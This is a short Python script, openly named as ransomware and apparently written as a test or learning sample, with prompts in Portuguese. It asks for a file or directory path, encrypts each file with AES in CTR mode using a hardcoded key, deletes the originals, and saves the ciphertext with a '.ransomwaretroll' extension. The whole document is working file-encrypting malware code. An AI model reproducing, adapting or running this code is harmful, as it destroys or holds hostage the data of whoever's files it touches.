import os
import pyaes
from pathlib import Path

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        file_data = file.read()

    os.remove(file_path)

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    ransom_file_path = f"{file_path}.ransomwaretroll"
    with open(ransom_file_path, "wb") as new_file:
        new_file.write(crypto_data)

def encrypt_directory(directory_path, key):
    path = Path(directory_path)
    for file_path in path.glob("*.*"): 
        encrypt_file(file_path, key)

if __name__ == "__main__":
    key = b"testeransomwares"
    
    target = input("Digite o caminho do arquivo ou diretório a ser criptografado: ")

    if os.path.isfile(target):
        encrypt_file(target, key)
        print(f"Arquivo {target} criptografado com sucesso!")
    elif os.path.isdir(target):
        encrypt_directory(target, key)
        print(f"Arquivos em {target} criptografados com sucesso!")
    else:
        print("Caminho inválido. Certifique-se de inserir o caminho correto para o arquivo ou diretório.")
